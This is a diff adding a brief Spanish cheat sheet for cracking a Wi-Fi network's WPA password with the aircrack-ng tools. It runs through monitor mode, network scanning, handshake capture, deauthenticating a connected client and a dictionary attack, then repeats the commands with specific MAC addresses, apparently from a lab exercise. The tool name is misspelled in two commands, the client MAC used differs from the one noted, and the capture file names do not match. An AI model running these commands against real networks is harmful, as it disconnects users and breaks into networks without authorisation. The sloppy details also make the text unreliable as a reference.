@@ -1,0 +1,21 @@
+1) Tajeta modo monitor: sudo airmon-ng start wlp2s0
+
+2) Sacar las redes y el bssid: sudo airodump-ng mon0
+
+3) Comenzar captura: sudo airodump-ng -c 1 --write <nombreCaptura> --bssid <bssid> mon0
+
+4) Desautenticar usuario:sudo aireplay-ng --deauth 5 -a <bssid> -c <station> mon0
+
+5) Crackear password:sudo aircrak-ng -w <rutaDiccionario> -b <bssid> nombreCaptura.cap
+
+
+
+bssid => D8:54:A2:54:1E:14
+
+sudo airodump-ng -c 1 --write labinfo --bssid D8:54:A2:54:1E:14 mon0
+
+station => 80:19:34:99:CB:68
+
+sudo aireplay-ng --deauth 5 -a D8:54:A2:54:1E:14 -c 48:50:73:F7:FF:74  mon0
+
+sudo aircrak-ng -w test.txt -b D8:54:A2:54:1E:14 lab01.cap
